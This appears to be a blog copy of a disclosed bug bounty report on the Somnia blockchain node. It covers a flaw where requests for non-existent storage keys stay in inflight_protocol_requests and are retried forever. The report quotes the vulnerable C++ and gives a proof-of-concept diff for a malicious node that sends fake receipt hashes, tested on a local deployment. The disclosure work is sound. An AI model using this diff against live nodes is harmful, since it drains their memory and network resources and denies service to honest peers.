---
title: "Non-existent ConsensusFinishedNetworkMessage Stuck in inflight_protocol_requests forever Cause Node Resource Exhaustion and DOS"
date: 2025-09-17 12:00:00 +0700
categories: [Audits, Somnia]
tags: [cpp, somnia, dos, memory leak, hackenproof]
description: >-
  Non-existent storage keys stuck forever in inflight_protocol_requests — a confirmed Medium finding on Somnia (SOMNIAAC-180).
image: /assets/img/somnia.jpg
---

> You can also view the full bug on the HackenProof disclosed report: [https://hackenproof.com/reports/SOMNIAAC-180](https://hackenproof.com/reports/SOMNIAAC-180)
{: .prompt-info }

## Metadata

- **Report ID:** [SOMNIAAC-180](https://hackenproof.com/reports/SOMNIAAC-180)
- **Severity:** Medium
- **Status:** Disclosed
- **Category:** Blockchain
- **Created by:** uint256vieet
- **Created at:** September 17, 2025
- **Reward:** 5126.58 $

## Summary

A critical vulnerability exists in the storage database protocol sharing system where requests for non-existent storage keys remain permanently in the `inflight_protocol_requests` set, causing infinite retries and eventual resource exhaustion.

When malicious nodes send fake `ConsensusFinishedNetworkMessage` with non-existent hashes, victim nodes will continuously retry these requests forever, consuming memory and network resources until they reach system limits and deny service to honest requests.

## Vulnerability Details

### System Overview

- The Somnia node implements a distributed storage system where nodes can request missing data from peers through the `StorageDatabaseProtocolSharing` mechanism.
- Each storage key type (like `PBFT_FINALISED_NETWORK_RECEIPT`) has its own dedicated worker thread, request queue, and resource system to prevent starvation between different key types.

### Request Flow Architecture

When a node needs data it doesn't have locally, the following flow occurs:

- **Request Initiation**: `GetOrRequestSmashProtocolData()` is called with `disable_peer_requesting = false`
- **Local Check**: `GetOrRequestProtocolData()` first checks if data exists locally via `GetData()`
- **Network Request**: If not found locally, `RequestProtocolData()` is called
- **Queue Addition**: The request is added to the key-type-specific worker's `request_queue`
- **Inflight Tracking**: The key is added to `inflight_protocol_requests` set
- **Resource System**: `ResourceSystem::RequestObject()` is called to handle the network request

### The Vulnerability

The vulnerability lies in the **incomplete cleanup mechanism** for failed requests:

#### Request Processing

```cpp
void StorageDatabaseProtocolSharing::ProcessRequestOnBackgroundThread(KeyTypeWorker& worker, StorageKey storage_key) {
  // Add to inflight requests
  {
    std::lock_guard guard{worker.inflight_protocol_requests_lock};
    worker.inflight_protocol_requests.emplace(storage_key);
  }

  // Make the request using the resource system
  worker.resource_system->RequestObject(
      std::nullopt, storage_key,
      [this, storage_key, worker_ptr = &worker](const StorageValue& value) -> bool {
        // Validation and success handling
        if (!worker_ptr->validator->ValidateValue(storage_key, value)) {
          return false; // Invalid data - will retry
        }

        // SUCCESS: Remove from inflight requests
        {
          std::lock_guard guard{worker_ptr->inflight_protocol_requests_lock};
          worker_ptr->inflight_protocol_requests.erase(storage_key);
        }
        return true;
      });
}
```

#### Response Handling for Non-Existent Keys

```cpp
// In ResourceSystem::RegisterRequestHandler
on_request_handler = [this, can_respond_handler](const RequestObjectMessage& request_object_message) {
  // Deserialise the request
  RequestType request;
  smash::SmashDecoder request_reader{request_object_message.serialised_payload};
  if (!request_reader.TryRead(request)) {
    return; // Deserialization failed
  }

  // Check if we can respond
  if (!can_respond_handler(request)) {
    return; // NO RESPONSE SENT - THIS IS THE PROBLEM
  }

  // Send ObjectAvailableMessage only if we have the data
  ObjectAvailableMessage object_available_message;
  // ... send response
};
```

#### The Root Cause

**The critical issue is that there is NO cleanup mechanism for requests that never receive any response.**

- **Success Path**: When a peer has the requested data, it sends `ObjectAvailableMessage` → `ObjectDataMessage` → success callback → `inflight_protocol_requests.erase()`
- **Failure Path**: When no peer has the requested data (non-existent key), **NO response is ever sent**, so:
  - The success callback is never called
  - `inflight_protocol_requests.erase()` is never called
  - The key remains in `inflight_protocol_requests` forever
  - `ResourceSystem` retries the request forever with exponential backoff

#### Resource System Retry Logic

```cpp
// In ResourceSystemBase::Tick()
if (now > request.request_retry_start_time + request.request_timeout) {
  // The request timed out. Increase the timeout and retry.
  request.request_timeout *= 2;
  request.request_timeout = std::min<RealClock::duration>(request.request_timeout, parameters.max_request_timeout);
  RestartRequest(request); // <----------INFINITE RETRIES
}
```

### Attack Vector

Malicious nodes can exploit this by sending `ConsensusFinishedNetworkMessage` with fake `finalised_network_receipt_hash` values:

```cpp
// In ConsensusManager::ReceivedMessage()
if (!storage_database.GetOrRequestSmashProtocolData(
        StorageKey::KeyFromHash(StorageKeyType::PBFT_FINALISED_NETWORK_RECEIPT,
                                message.finalised_network_receipt_hash), //<-----FAKE non-exist finalised_network_receipt_hash
        finalised_network_receipt)) {
  // This triggers the vulnerable request flow
}
```

Since `PBFT_FINALISED_NETWORK_RECEIPT` has protocol sharing enabled, the request will be processed and stuck forever.

## Impact Details

### Resource Exhaustion and Denial of Service

- **Memory Leak**: Each fake hash request permanently consumes memory in the `inflight_protocol_requests` set
- **Network Bandwidth**: Continuous retry attempts consume network resources every 4 minutes (max timeout)
- **CPU Cycles**: Background threads continuously process failed requests
- **Queue Starvation**: When `inflight_protocol_requests` grows large, it may impact processing of legitimate requests

### Attack Scalability

- **Persistent Effect**: Each fake hash causes permanent resource consumption until node restart
- **Cumulative Impact**: Multiple attackers or repeated attacks compound the resource exhaustion

## References

- Storage Database Protocol Sharing: `somnia/storage/storage_database_protocol_sharing.cc`
- Resource System Implementation: `somnia/protocol/resource_system.cc`
- Consensus Manager Message Handling: `somnia/consensus/consensus_manager.cc`
- Rate Limiting Parameters: `somnia/parameters/local_parameters.h`
- Storage Key Types: `somnia/storage/storage_key.h`

## Proof of Concept

### Craft a malicious node

Apply this diff below for a malicious node:

```diff
diff --git a/somnia/consensus/consensus_manager.cc b/somnia/consensus/consensus_manager.cc
index aaf16f02..2edd211a 100644
--- a/somnia/consensus/consensus_manager.cc
+++ b/somnia/consensus/consensus_manager.cc
@@ -185,30 +185,38 @@ void ConsensusManager::Tick() {

 void ConsensusManager::ReceivedMessage(const ConsensusManagerHeartbeatMessage& message) {
   // Inform the peer liveness manager that a message was received.
-  peer_liveness_manager.ReceivedLivenessMessage(message.epoch_number, message.sender);
+  // peer_liveness_manager.ReceivedLivenessMessage(message.epoch_number, message.sender);

-  if (message.epoch_number >= current_epoch_number) {
-    // We have also not finished this epoch, so nothing to send back to this peer.
-    return;
-  }
+  // if (message.epoch_number >= current_epoch_number) {
+  //   // We have also not finished this epoch, so nothing to send back to this peer.
+  //   return;
+  // }

   // See if we have the finalised network receipt hash in our storage database.
-  Hash finalised_network_receipt_hash;
-  if (!storage_database.GetSmashData(
-          StorageKey::KeyFromInt(
-              StorageKeyType::PBFT_EPOCH_NUMBER_TO_FINALISED_NETWORK_RECEIPT_HASH,
-              message.epoch_number),
-          finalised_network_receipt_hash)) {
-    // We do not have the receipt for this epoch.
-    return;
-  }
+  // Hash finalised_network_receipt_hash;
+  // if (!storage_database.GetSmashData(
+  //         StorageKey::KeyFromInt(
+  //             StorageKeyType::PBFT_EPOCH_NUMBER_TO_FINALISED_NETWORK_RECEIPT_HASH,
+  //             message.epoch_number),
+  //         finalised_network_receipt_hash)) {
+  //   // We do not have the receipt for this epoch.
+  //   return;
+  // }

   // Send a message to this peer with this receipt hash.
   spdlog::debug("Sending ConsensusFinishedNetworkMessage to {} for {}", message.sender,
                 message.epoch_number);
+  // TEST: Send a fake/non-existent receipt hash to test how other nodes handle it
+  Hash fake_hash;
+  // <-----------HERE: Create a random fake hash that definitely doesn't exist
+  GenerateRandomBytes(fake_hash);
+  fake_hash[0] = 0xFA;   // Make it clearly fake
+  fake_hash[31] = 0xFE;  // End with fake marker
+
+  spdlog::warn("TESTING: Sending FAKE random receipt hash {} ", fake_hash);
+
   protocol_outgoing_router.SendMessageToPeer<ConsensusManagerMessage>(
-      message.sender,
-      ConsensusFinishedNetworkMessage{message.epoch_number, finalised_network_receipt_hash});
+      message.sender, ConsensusFinishedNetworkMessage{message.epoch_number, fake_hash});
 }

 void ConsensusManager::ReceivedMessage(const ConsensusFinishedNetworkMessage& message) {
diff --git a/somnia/parameters/parameters_loader.cc b/somnia/parameters/parameters_loader.cc
index 2d0195d2..12fcc2dc 100644
--- a/somnia/parameters/parameters_loader.cc
+++ b/somnia/parameters/parameters_loader.cc
@@ -372,7 +372,8 @@ void ChainParametersLoader::ApplyBaseProductionChainParameters(ChainParameters&
   chain_parameters.local_parameters.storage_database_directory = "/tmp/somnia";

   // Set the epoch length to 5 minutes.
-  chain_parameters.protocol_parameters.ledger_blocks_per_epoch = 3000;
+  chain_parameters.protocol_parameters.ledger_blocks_per_epoch =
+      50;  //@audit change to 50 for easy to notice

   // Set the ice database sizes.
   chain_parameters.protocol_parameters.world_state_protocol_parameters.bls_link_state_parameters
```

This malicious node will send a fake `ConsensusFinishedNetworkMessage` with a non-existent `finalised_network_receipt_hash` to other nodes after receiving a heartbeat, making those requests stuck in `inflight_protocol_requests` and retry forever.

### Modify the script to start the network with honest nodes 1, 2, and 3, and malicious node 4

```diff
diff --git a/ci/run-local-deployment.sh b/ci/run-local-deployment.sh
index ab51ed8c..a9bef38e 100755
--- a/ci/run-local-deployment.sh
+++ b/ci/run-local-deployment.sh
@@ -16,8 +16,10 @@ echo "Starting $NUM_VALIDATORS validators."
 export LOCAL_DEPLOYMENT_PID=$(echo $$)

 # Build somnia
-bazel build --config release //somnia
+bazel build --jobs 4  --config release //somnia
 export SOMNIA_BIN=bazel-bin/somnia/somnia
+export SOMNIA_BIN_MALICIOUS=bazel-bin/somnia/somnia-malicious
+

 # Ensure the test user set exists, which is used to build the genesis state,
 # and generate the transactions.
@@ -109,7 +111,12 @@ function runNode {

     # Start the node.
     echo "Starting validator $validator_index on ports $protocol_port and $data_port"
-    $SOMNIA_BIN node \
+    # Use the custom binary for validator index 3 (the 4th malicious node).
+    NODE_BIN=$SOMNIA_BIN
+    if [ "$validator_index" -eq 3 ]; then
+        NODE_BIN=$SOMNIA_BIN_MALICIOUS
+    fi
+    $NODE_BIN node \
         --local-parameters.protocol-listen-port $protocol_port \
         --local-parameters.data-listen-port $data_port \
         --local-parameters.api-http-port $api_http_port \
```

### Start the network normally

```shell
./ci/run-local-deployment.sh
```

- `tail -f node_data/somnia_local_depl_0.log | grep "Storage database has"`
- `tail -f node_data/somnia_local_depl_2.log | grep "Restarting with"`

Below is the log image showing that every non-existent `finalised_network_receipt_hash` in `ConsensusFinishedNetworkMessage` requests to node1, node2 and node3 failed, got stuck, and retried forever:

![PoC logs](/assets/img/somnia-poc-logs.png)

